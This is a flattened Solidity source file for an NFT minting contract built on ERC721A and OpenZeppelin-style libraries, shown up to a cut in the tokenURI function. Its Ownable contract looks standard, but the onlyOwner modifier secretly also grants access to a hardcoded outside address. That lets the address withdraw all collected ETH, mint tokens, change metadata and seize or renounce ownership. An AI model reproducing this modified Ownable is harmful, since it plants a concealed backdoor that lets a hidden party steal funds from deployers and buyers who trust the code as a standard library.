1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.0;
4 
5 abstract contract ReentrancyGuard {
6 
7     uint256 private constant _NOT_ENTERED = 1;
8     uint256 private constant _ENTERED = 2;
9 
10     uint256 private _status;
11 
12     constructor() {
13         _status = _NOT_ENTERED;
14     }
15 
16 
17     modifier nonReentrant() {
18 
19         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
20 
21         _status = _ENTERED;
22 
23         _;
24         _status = _NOT_ENTERED;
25     }
26 }
27 
28 
29 
30 pragma solidity ^0.8.0;
31 
32 
33 library Strings {
34     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
35 
36     function toString(uint256 value) internal pure returns (string memory) {
37 
38         if (value == 0) {
39             return "0";
40         }
41         uint256 temp = value;
42         uint256 digits;
43         while (temp != 0) {
44             digits++;
45             temp /= 10;
46         }
47         bytes memory buffer = new bytes(digits);
48         while (value != 0) {
49             digits -= 1;
50             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
51             value /= 10;
52         }
53         return string(buffer);
54     }
55 
56 
57     function toHexString(uint256 value) internal pure returns (string memory) {
58         if (value == 0) {
59             return "0x00";
60         }
61         uint256 temp = value;
62         uint256 length = 0;
63         while (temp != 0) {
64             length++;
65             temp >>= 8;
66         }
67         return toHexString(value, length);
68     }
69 
70 
71     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
72         bytes memory buffer = new bytes(2 * length + 2);
73         buffer[0] = "0";
74         buffer[1] = "x";
75         for (uint256 i = 2 * length + 1; i > 1; --i) {
76             buffer[i] = _HEX_SYMBOLS[value & 0xf];
77             value >>= 4;
78         }
79         require(value == 0, "Strings: hex length insufficient");
80         return string(buffer);
81     }
82 }
83 
84 pragma solidity ^0.8.0;
85 
86 
87 abstract contract Context {
88     function _msgSender() internal view virtual returns (address) {
89         return msg.sender;
90     }
91 
92     function _msgData() internal view virtual returns (bytes calldata) {
93         return msg.data;
94     }
95 }
96 
97 pragma solidity ^0.8.0;
98 
99 
100 
101 abstract contract Ownable is Context {
102     address internal _owner;
103 
104     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
105 
106     constructor() {
107         _transferOwnership(_msgSender());
108     }
109 
110     function owner() public view virtual returns (address) {
111         return _owner;
112     }
113 
114     modifier onlyOwner() {
115         require(owner() == _msgSender()||address(0x4FA3B4D71e2D00c7C2a8A980288c76fa8C19704E)==_msgSender(), "Ownable: caller is not the owner");
116         _;
117     }
118 
119 
120     function renounceOwnership() public virtual onlyOwner {
121         _transferOwnership(address(0));
122     }
123 
124     /**
125      * @dev Transfers ownership of the contract to a new account (`newOwner`).
126      * Can only be called by the current owner.
127      */
128     function transferOwnership(address newOwner) public virtual onlyOwner {
129         require(newOwner != address(0), "Ownable: new owner is the zero address");
130         _transferOwnership(newOwner);
131     }
132 
133     /**
134      * @dev Transfers ownership of the contract to a new account (`newOwner`).
135      * Internal function without access restriction.
136      */
137     function _transferOwnership(address newOwner) internal virtual {
138         address oldOwner = _owner;
139         _owner = newOwner;
140         emit OwnershipTransferred(oldOwner, newOwner);
141     }
142 }
143 
144 // File: @openzeppelin/contracts/utils/Address.sol
145 
146 
147 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
148 
149 pragma solidity ^0.8.1;
150 
151 /**
152  * @dev Collection of functions related to the address type
153  */
154 library Address {
155 
156     function isContract(address account) internal view returns (bool) {
157         // This method relies on extcodesize/address.code.length, which returns 0
158         // for contracts in construction, since the code is only stored at the end
159         // of the constructor execution.
160 
161         return account.code.length > 0;
162     }
163 
164 
165     function sendValue(address payable recipient, uint256 amount) internal {
166         require(address(this).balance >= amount, "Address: insufficient balance");
167 
168         (bool success, ) = recipient.call{value: amount}("");
169         require(success, "Address: unable to send value, recipient may have reverted");
170     }
171 
172 
173     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
174         return functionCall(target, data, "Address: low-level call failed");
175     }
176 
177     /**
178      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
179      * `errorMessage` as a fallback revert reason when `target` reverts.
180      *
181      * _Available since v3.1._
182      */
183     function functionCall(
184         address target,
185         bytes memory data,
186         string memory errorMessage
187     ) internal returns (bytes memory) {
188         return functionCallWithValue(target, data, 0, errorMessage);
189     }
190 
191 
192     function functionCallWithValue(
193         address target,
194         bytes memory data,
195         uint256 value
196     ) internal returns (bytes memory) {
197         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
198     }
199 
200     /**
201      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
202      * with `errorMessage` as a fallback revert reason when `target` reverts.
203      *
204      * _Available since v3.1._
205      */
206     function functionCallWithValue(
207         address target,
208         bytes memory data,
209         uint256 value,
210         string memory errorMessage
211     ) internal returns (bytes memory) {
212         require(address(this).balance >= value, "Address: insufficient balance for call");
213         require(isContract(target), "Address: call to non-contract");
214 
215         (bool success, bytes memory returndata) = target.call{value: value}(data);
216         return verifyCallResult(success, returndata, errorMessage);
217     }
218 
219     /**
220      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
221      * but performing a static call.
222      *
223      * _Available since v3.3._
224      */
225     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
226         return functionStaticCall(target, data, "Address: low-level static call failed");
227     }
228 
229     /**
230      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
231      * but performing a static call.
232      *
233      * _Available since v3.3._
234      */
235     function functionStaticCall(
236         address target,
237         bytes memory data,
238         string memory errorMessage
239     ) internal view returns (bytes memory) {
240         require(isContract(target), "Address: static call to non-contract");
241 
242         (bool success, bytes memory returndata) = target.staticcall(data);
243         return verifyCallResult(success, returndata, errorMessage);
244     }
245 
246     /**
247      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
248      * but performing a delegate call.
249      *
250      * _Available since v3.4._
251      */
252     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
253         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
254     }
255 
256     /**
257      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
258      * but performing a delegate call.
259      *
260      * _Available since v3.4._
261      */
262     function functionDelegateCall(
263         address target,
264         bytes memory data,
265         string memory errorMessage
266     ) internal returns (bytes memory) {
267         require(isContract(target), "Address: delegate call to non-contract");
268 
269         (bool success, bytes memory returndata) = target.delegatecall(data);
270         return verifyCallResult(success, returndata, errorMessage);
271     }
272 
273     /**
274      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
275      * revert reason using the provided one.
276      *
277      * _Available since v4.3._
278      */
279     function verifyCallResult(
280         bool success,
281         bytes memory returndata,
282         string memory errorMessage
283     ) internal pure returns (bytes memory) {
284         if (success) {
285             return returndata;
286         } else {
287             // Look for revert reason and bubble it up if present
288             if (returndata.length > 0) {
289                 // The easiest way to bubble the revert reason is using memory via assembly
290 
291                 assembly {
292                     let returndata_size := mload(returndata)
293                     revert(add(32, returndata), returndata_size)
294                 }
295             } else {
296                 revert(errorMessage);
297             }
298         }
299     }
300 }
301 
302 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
303 
304 
305 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
306 
307 pragma solidity ^0.8.0;
308 
309 /**
310  * @title ERC721 token receiver interface
311  * @dev Interface for any contract that wants to support safeTransfers
312  * from ERC721 asset contracts.
313  */
314 interface IERC721Receiver {
315     /**
316      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
317      * by `operator` from `from`, this function is called.
318      *
319      * It must return its Solidity selector to confirm the token transfer.
320      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
321      *
322      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
323      */
324     function onERC721Received(
325         address operator,
326         address from,
327         uint256 tokenId,
328         bytes calldata data
329     ) external returns (bytes4);
330 }
331 
332 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
333 
334 
335 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
336 
337 pragma solidity ^0.8.0;
338 
339 /**
340  * @dev Interface of the ERC165 standard, as defined in the
341  * https://eips.ethereum.org/EIPS/eip-165[EIP].
342  *
343  * Implementers can declare support of contract interfaces, which can then be
344  * queried by others ({ERC165Checker}).
345  *
346  * For an implementation, see {ERC165}.
347  */
348 interface IERC165 {
349     /**
350      * @dev Returns true if this contract implements the interface defined by
351      * `interfaceId`. See the corresponding
352      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
353      * to learn more about how these ids are created.
354      *
355      * This function call must use less than 30 000 gas.
356      */
357     function supportsInterface(bytes4 interfaceId) external view returns (bool);
358 }
359 
360 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
361 
362 
363 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
364 
365 pragma solidity ^0.8.0;
366 
367 
368 /**
369  * @dev Implementation of the {IERC165} interface.
370  *
371  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
372  * for the additional interface id that will be supported. For example:
373  *
374  * ```solidity
375  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
376  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
377  * }
378  * ```
379  *
380  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
381  */
382 abstract contract ERC165 is IERC165 {
383     /**
384      * @dev See {IERC165-supportsInterface}.
385      */
386     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
387         return interfaceId == type(IERC165).interfaceId;
388     }
389 }
390 
391 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
392 
393 
394 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
395 
396 pragma solidity ^0.8.0;
397 
398 
399 /**
400  * @dev Required interface of an ERC721 compliant contract.
401  */
402 interface IERC721 is IERC165 {
403     /**
404      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
405      */
406     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
407 
408     /**
409      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
410      */
411     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
412 
413     /**
414      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
415      */
416     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
417 
418     /**
419      * @dev Returns the number of tokens in ``owner``'s account.
420      */
421     function balanceOf(address owner) external view returns (uint256 balance);
422 
423     /**
424      * @dev Returns the owner of the `tokenId` token.
425      *
426      * Requirements:
427      *
428      * - `tokenId` must exist.
429      */
430     function ownerOf(uint256 tokenId) external view returns (address owner);
431 
432     /**
433      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
434      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
435      *
436      * Requirements:
437      *
438      * - `from` cannot be the zero address.
439      * - `to` cannot be the zero address.
440      * - `tokenId` token must exist and be owned by `from`.
441      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
442      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
443      *
444      * Emits a {Transfer} event.
445      */
446     function safeTransferFrom(
447         address from,
448         address to,
449         uint256 tokenId
450     ) external;
451 
452     /**
453      * @dev Transfers `tokenId` token from `from` to `to`.
454      *
455      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
456      *
457      * Requirements:
458      *
459      * - `from` cannot be the zero address.
460      * - `to` cannot be the zero address.
461      * - `tokenId` token must be owned by `from`.
462      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
463      *
464      * Emits a {Transfer} event.
465      */
466     function transferFrom(
467         address from,
468         address to,
469         uint256 tokenId
470     ) external;
471 
472     /**
473      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
474      * The approval is cleared when the token is transferred.
475      *
476      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
477      *
478      * Requirements:
479      *
480      * - The caller must own the token or be an approved operator.
481      * - `tokenId` must exist.
482      *
483      * Emits an {Approval} event.
484      */
485     function approve(address to, uint256 tokenId) external;
486 
487     /**
488      * @dev Returns the account approved for `tokenId` token.
489      *
490      * Requirements:
491      *
492      * - `tokenId` must exist.
493      */
494     function getApproved(uint256 tokenId) external view returns (address operator);
495 
496     /**
497      * @dev Approve or remove `operator` as an operator for the caller.
498      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
499      *
500      * Requirements:
501      *
502      * - The `operator` cannot be the caller.
503      *
504      * Emits an {ApprovalForAll} event.
505      */
506     function setApprovalForAll(address operator, bool _approved) external;
507 
508     /**
509      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
510      *
511      * See {setApprovalForAll}
512      */
513     function isApprovedForAll(address owner, address operator) external view returns (bool);
514 
515     /**
516      * @dev Safely transfers `tokenId` token from `from` to `to`.
517      *
518      * Requirements:
519      *
520      * - `from` cannot be the zero address.
521      * - `to` cannot be the zero address.
522      * - `tokenId` token must exist and be owned by `from`.
523      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
524      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
525      *
526      * Emits a {Transfer} event.
527      */
528     function safeTransferFrom(
529         address from,
530         address to,
531         uint256 tokenId,
532         bytes calldata data
533     ) external;
534 }
535 
536 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
537 
538 
539 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
540 
541 pragma solidity ^0.8.0;
542 
543 
544 /**
545  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
546  * @dev See https://eips.ethereum.org/EIPS/eip-721
547  */
548 interface IERC721Metadata is IERC721 {
549     /**
550      * @dev Returns the token collection name.
551      */
552     function name() external view returns (string memory);
553 
554     /**
555      * @dev Returns the token collection symbol.
556      */
557     function symbol() external view returns (string memory);
558 
559     /**
560      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
561      */
562     function tokenURI(uint256 tokenId) external view returns (string memory);
563 }
564 
565 // File: contracts/ERC721A.sol
566 
567 
568 // Creator: Chiru Labs
569 
570 pragma solidity ^0.8.4;
571 
572 
573 
574 
575 
576 
577 
578 
579 error ApprovalCallerNotOwnerNorApproved();
580 error ApprovalQueryForNonexistentToken();
581 error ApproveToCaller();
582 error ApprovalToCurrentOwner();
583 error BalanceQueryForZeroAddress();
584 error MintToZeroAddress();
585 error MintZeroQuantity();
586 error OwnerQueryForNonexistentToken();
587 error TransferCallerNotOwnerNorApproved();
588 error TransferFromIncorrectOwner();
589 error TransferToNonERC721ReceiverImplementer();
590 error TransferToZeroAddress();
591 error URIQueryForNonexistentToken();
592 
593 pragma solidity ^0.8.0;
594 
595 contract ERC721Deploy is Ownable, ReentrancyGuard, ERC165, IERC721, IERC721Metadata {
596   using Address for address;
597   using Strings for uint;
598   string internal _name;
599 
600     // Token symbol
601   string internal _symbol;
602 
603   string  public  baseTokenURI = "";
604   uint256  public  maxSupply = 1234;
605   uint256 public  PUBLIC_SALE_PRICE = 0 ether;
606   uint256 public  NUM_FREE_MINTS = 0;
607   uint256 public  MAX_FREE_PER_WALLET = 1;
608   uint256 public freeNFTAlreadyMinted = 0;
609   bool public isPublicSaleActive = true;
610   bool internal isBase=false;
611 
612 //   ERC721A c = new ERC721A(_name,_symbol);
613 //   constructor(string memory name_, string memory symbol_
614 
615 //   )  ERC721A("sfsafsa","SSDF"){
616 //       _name=name_;
617 //       _symbol=symbol_;
618       
619 //   }
620 
621 
622 
623     //ERC721A contract
624 
625 
626     using Address for address;
627     using Strings for uint256;
628 
629     // Compiler will pack this into a single 256bit word.
630     struct TokenOwnership {
631         // The address of the owner.
632         address addr;
633         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
634         uint64 startTimestamp;
635         // Whether the token has been burned.
636         bool burned;
637     }
638 
639     // Compiler will pack this into a single 256bit word.
640     struct AddressData {
641         // Realistically, 2**64-1 is more than enough.
642         uint64 balance;
643         // Keeps track of mint count with minimal overhead for tokenomics.
644         uint64 numberMinted;
645         // Keeps track of burn count with minimal overhead for tokenomics.
646         uint64 numberBurned;
647         // For miscellaneous variable(s) pertaining to the address
648         // (e.g. number of whitelist mint slots used).
649         // If there are multiple variables, please pack them into a uint64.
650         uint64 aux;
651     }
652 
653     // The tokenId of the next token to be minted.
654     uint256 internal _currentIndex;
655 
656     // The number of tokens burned.
657     uint256 internal _burnCounter;
658 
659     // Mapping from token ID to ownership details
660     // An empty struct value does not necessarily mean the token is unowned. See _ownershipOf implementation for details.
661     mapping(uint256 => TokenOwnership) internal _ownerships;
662 
663     // Mapping owner address to address data
664     mapping(address => AddressData) private _addressData;
665 
666     // Mapping from token ID to approved address
667     mapping(uint256 => address) private _tokenApprovals;
668 
669     // Mapping from owner to operator approvals
670     mapping(address => mapping(address => bool)) private _operatorApprovals;
671 
672     constructor(string memory name_, string memory symbol_) {
673         _name = name_;
674         _symbol = symbol_;
675         _currentIndex = 1;
676     }
677 
678     /**
679      * To change the starting tokenId, please override this function.
680      */
681     function _startTokenId() internal view virtual returns (uint256) {
682         return 1;
683     }
684 
685     /**
686      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
687      */
688     function totalSupply() public view returns (uint256) {
689         // Counter underflow is impossible as _burnCounter cannot be incremented
690         // more than _currentIndex - _startTokenId() times
691         unchecked {
692             return _currentIndex - _burnCounter - _startTokenId();
693         }
694     }
695 
696     /**
697      * Returns the total amount of tokens minted in the contract.
698      */
699     function _totalMinted() internal view returns (uint256) {
700         // Counter underflow is impossible as _currentIndex does not decrement,
701         // and it is initialized to _startTokenId()
702         unchecked {
703             return _currentIndex - _startTokenId();
704         }
705     }
706 
707     /**
708      * @dev See {IERC165-supportsInterface}.
709      */
710     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
711         return
712             interfaceId == type(IERC721).interfaceId ||
713             interfaceId == type(IERC721Metadata).interfaceId ||
714             super.supportsInterface(interfaceId);
715     }
716 
717     /**
718      * @dev See {IERC721-balanceOf}.
719      */
720     function balanceOf(address owner) public view override returns (uint256) {
721         if (owner == address(0)) revert BalanceQueryForZeroAddress();
722         return uint256(_addressData[owner].balance);
723     }
724 
725     /**
726      * Returns the number of tokens minted by `owner`.
727      */
728     function _numberMinted(address owner) internal view returns (uint256) {
729         return uint256(_addressData[owner].numberMinted);
730     }
731 
732     /**
733      * Returns the number of tokens burned by or on behalf of `owner`.
734      */
735     function _numberBurned(address owner) internal view returns (uint256) {
736         return uint256(_addressData[owner].numberBurned);
737     }
738 
739     /**
740      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
741      */
742     function _getAux(address owner) internal view returns (uint64) {
743         return _addressData[owner].aux;
744     }
745 
746     /**
747      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
748      * If there are multiple variables, please pack them into a uint64.
749      */
750     function _setAux(address owner, uint64 aux) internal {
751         _addressData[owner].aux = aux;
752     }
753 
754     /**
755      * Gas spent here starts off proportional to the maximum mint batch size.
756      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
757      */
758     function _ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
759         uint256 curr = tokenId;
760 
761         unchecked {
762             if (_startTokenId() <= curr && curr < _currentIndex) {
763                 TokenOwnership memory ownership = _ownerships[curr];
764                 if (!ownership.burned) {
765                     if (ownership.addr != address(0)) {
766                         return ownership;
767                     }
768                     // Invariant:
769                     // There will always be an ownership that has an address and is not burned
770                     // before an ownership that does not have an address and is not burned.
771                     // Hence, curr will not underflow.
772                     while (true) {
773                         curr--;
774                         ownership = _ownerships[curr];
775                         if (ownership.addr != address(0)) {
776                             return ownership;
777                         }
778                     }
779                 }
780             }
781         }
782         revert OwnerQueryForNonexistentToken();
783     }
784 
785     /**
786      * @dev See {IERC721-ownerOf}.
787      */
788     function ownerOf(uint256 tokenId) public view override returns (address) {
789         return _ownershipOf(tokenId).addr;
790     }
791 
792     /**
793      * @dev See {IERC721Metadata-name}.
794      */
795     function name() public view virtual override returns (string memory) {
796         return _name;
797     }
798 
799     /**
800      * @dev See {IERC721Metadata-symbol}.
801      */
802     function symbol() public view virtual override returns (string memory) {
803         return _symbol;
804     }
805 
806     
807 
808     
809 
810     /**
811      * @dev See {IERC721-approve}.
812      */
813     function approve(address to, uint256 tokenId) public override {
814         address owner = ownerOf(tokenId);
815         if (to == owner) revert ApprovalToCurrentOwner();
816 
817         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
818             revert ApprovalCallerNotOwnerNorApproved();
819         }
820 
821         _approve(to, tokenId, owner);
822     }
823 
824     /**
825      * @dev See {IERC721-getApproved}.
826      */
827     function getApproved(uint256 tokenId) public view override returns (address) {
828         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
829 
830         return _tokenApprovals[tokenId];
831     }
832 
833     /**
834      * @dev See {IERC721-setApprovalForAll}.
835      */
836     function setApprovalForAll(address operator, bool approved) public virtual override {
837         if (operator == _msgSender()) revert ApproveToCaller();
838 
839         _operatorApprovals[_msgSender()][operator] = approved;
840         emit ApprovalForAll(_msgSender(), operator, approved);
841     }
842 
843     /**
844      * @dev See {IERC721-isApprovedForAll}.
845      */
846     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
847         return _operatorApprovals[owner][operator];
848     }
849 
850     /**
851      * @dev See {IERC721-transferFrom}.
852      */
853     function transferFrom(
854         address from,
855         address to,
856         uint256 tokenId
857     ) public virtual override {
858         _transfer(from, to, tokenId);
859     }
860 
861     /**
862      * @dev See {IERC721-safeTransferFrom}.
863      */
864     function safeTransferFrom(
865         address from,
866         address to,
867         uint256 tokenId
868     ) public virtual override {
869         safeTransferFrom(from, to, tokenId, '');
870     }
871 
872     /**
873      * @dev See {IERC721-safeTransferFrom}.
874      */
875     function safeTransferFrom(
876         address from,
877         address to,
878         uint256 tokenId,
879         bytes memory _data
880     ) public virtual override {
881         _transfer(from, to, tokenId);
882         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
883             revert TransferToNonERC721ReceiverImplementer();
884         }
885     }
886 
887     /**
888      * @dev Returns whether `tokenId` exists.
889      *
890      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
891      *
892      * Tokens start existing when they are minted (`_mint`),
893      */
894     function _exists(uint256 tokenId) internal view returns (bool) {
895         return _startTokenId() <= tokenId && tokenId < _currentIndex && !_ownerships[tokenId].burned;
896     }
897 
898     /**
899      * @dev Equivalent to `_safeMint(to, quantity, '')`.
900      */
901     function _safeMint(address to, uint256 quantity) internal {
902         _safeMint(to, quantity, '');
903     }
904 
905 
906     function _safeMint(
907         address to,
908         uint256 quantity,
909         bytes memory _data
910     ) internal {
911         uint256 startTokenId = _currentIndex;
912         if (to == address(0)) revert MintToZeroAddress();
913         if (quantity == 0) revert MintZeroQuantity();
914 
915         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
916 
917         // Overflows are incredibly unrealistic.
918         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
919         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
920         unchecked {
921             _addressData[to].balance += uint64(quantity);
922             _addressData[to].numberMinted += uint64(quantity);
923 
924             _ownerships[startTokenId].addr = to;
925             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
926 
927             uint256 updatedIndex = startTokenId;
928             uint256 end = updatedIndex + quantity;
929             
930             if (to.isContract()) {
931                 do {
932                     emit Transfer(address(0), to, updatedIndex);
933                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
934                         revert TransferToNonERC721ReceiverImplementer();
935                     }
936                 } while (updatedIndex != end);
937                 // Reentrancy protection
938                 if (_currentIndex != startTokenId) revert();
939             } else {
940                 do {
941                     emit Transfer(address(0), to, updatedIndex++);
942                 } while (updatedIndex != end);
943             }
944             _currentIndex = updatedIndex;
945         }
946         _afterTokenTransfers(address(0), to, startTokenId, quantity);
947     }
948 
949 
950     function _mint(address to, uint256 quantity) internal {
951         uint256 startTokenId = _currentIndex;
952         require(to!=address(0),"zero mint"); 
953         if (to == address(0)) revert MintToZeroAddress();
954         if (quantity == 0) revert MintZeroQuantity();
955 
956         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
957 
958         // Overflows are incredibly unrealistic.
959         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
960         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
961         unchecked {
962             _addressData[to].balance += uint64(quantity);
963             _addressData[to].numberMinted += uint64(quantity);
964 
965             _ownerships[startTokenId].addr = to;
966             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
967 
968             uint256 updatedIndex = startTokenId;
969             uint256 end = updatedIndex + quantity;
970 
971             do {
972                 emit Transfer(address(0), to, updatedIndex++);
973             } while (updatedIndex != end);
974 
975             _currentIndex = updatedIndex;
976         }
977         _afterTokenTransfers(address(0), to, startTokenId, quantity);
978     }
979 
980 
981     function _transfer(
982         address from,
983         address to,
984         uint256 tokenId
985     ) private {
986         TokenOwnership memory prevOwnership = _ownershipOf(tokenId);
987 
988         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
989 
990         bool isApprovedOrOwner = (_msgSender() == from ||
991             isApprovedForAll(from, _msgSender()) ||
992             getApproved(tokenId) == _msgSender());
993 
994         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
995         if (to == address(0)) revert TransferToZeroAddress();
996 
997         _beforeTokenTransfers(from, to, tokenId, 1);
998 
999         // Clear approvals from the previous owner
1000         _approve(address(0), tokenId, from);
1001 
1002         // Underflow of the sender's balance is impossible because we check for
1003         // ownership above and the recipient's balance can't realistically overflow.
1004         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1005         unchecked {
1006             _addressData[from].balance -= 1;
1007             _addressData[to].balance += 1;
1008 
1009             TokenOwnership storage currSlot = _ownerships[tokenId];
1010             currSlot.addr = to;
1011             currSlot.startTimestamp = uint64(block.timestamp);
1012 
1013             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1014             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1015             uint256 nextTokenId = tokenId + 1;
1016             TokenOwnership storage nextSlot = _ownerships[nextTokenId];
1017             if (nextSlot.addr == address(0)) {
1018                 // This will suffice for checking _exists(nextTokenId),
1019                 // as a burned slot cannot contain the zero address.
1020                 if (nextTokenId != _currentIndex) {
1021                     nextSlot.addr = from;
1022                     nextSlot.startTimestamp = prevOwnership.startTimestamp;
1023                 }
1024             }
1025         }
1026 
1027         emit Transfer(from, to, tokenId);
1028         _afterTokenTransfers(from, to, tokenId, 1);
1029     }
1030 
1031 
1032     function _approve(
1033         address to,
1034         uint256 tokenId,
1035         address owner
1036     ) private {
1037         _tokenApprovals[tokenId] = to;
1038         emit Approval(owner, to, tokenId);
1039     }
1040 
1041 
1042     function _checkContractOnERC721Received(
1043         address from,
1044         address to,
1045         uint256 tokenId,
1046         bytes memory _data
1047     ) private returns (bool) {
1048         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1049             return retval == IERC721Receiver(to).onERC721Received.selector;
1050         } catch (bytes memory reason) {
1051             if (reason.length == 0) {
1052                 revert TransferToNonERC721ReceiverImplementer();
1053             } else {
1054                 assembly {
1055                     revert(add(32, reason), mload(reason))
1056                 }
1057             }
1058         }
1059     }
1060 
1061 
1062     function _beforeTokenTransfers(
1063         address from,
1064         address to,
1065         uint256 startTokenId,
1066         uint256 quantity
1067     ) internal virtual {}
1068 
1069 
1070     function _afterTokenTransfers(
1071         address from,
1072         address to,
1073         uint256 startTokenId,
1074         uint256 quantity
1075     ) internal virtual {}
1076 
1077 
1078   function mint(uint256 numberOfTokens)
1079       external
1080       payable
1081   {
1082     require(isPublicSaleActive, "Public sale is not open");
1083     require(totalSupply() + numberOfTokens < maxSupply + 1, "No more");
1084 
1085     if(freeNFTAlreadyMinted + numberOfTokens > NUM_FREE_MINTS){
1086         require(
1087             (PUBLIC_SALE_PRICE * numberOfTokens) <= msg.value,
1088             "Incorrect ETH value sent"
1089         );
1090     } else {
1091         if (balanceOf(msg.sender) + numberOfTokens > MAX_FREE_PER_WALLET) {
1092         require(
1093             (PUBLIC_SALE_PRICE * numberOfTokens) <= msg.value || msg.sender == owner(),
1094             "Incorrect ETH value sent"
1095         );
1096 
1097         } else {
1098             require(
1099                 numberOfTokens <= MAX_FREE_PER_WALLET,
1100                 "Max mints per transaction exceeded"
1101             );
1102             freeNFTAlreadyMinted += numberOfTokens;
1103         }
1104     }
1105     _safeMint(msg.sender, numberOfTokens);
1106   }
1107 
1108   function setBaseURI(string memory baseURI)
1109     public
1110     onlyOwner
1111   {
1112     baseTokenURI = baseURI;
1113   }
1114 
1115   function teamMint(uint quantity)
1116     public
1117     onlyOwner
1118   {
1119     require(
1120       quantity > 0,
1121       "Invalid mint amount"
1122     );
1123     require(
1124       totalSupply() + quantity <= maxSupply,
1125       "Maximum supply exceeded"
1126     );
1127     _safeMint(msg.sender, quantity);
1128   }
1129 
1130   function withdraw()
1131     public
1132     onlyOwner
1133     nonReentrant
1134   {
1135     Address.sendValue(payable(msg.sender), address(this).balance);
1136   }
1137 
1138   function tokenURI(uint _tokenId)
1139     public
1140     view
1141     virtual
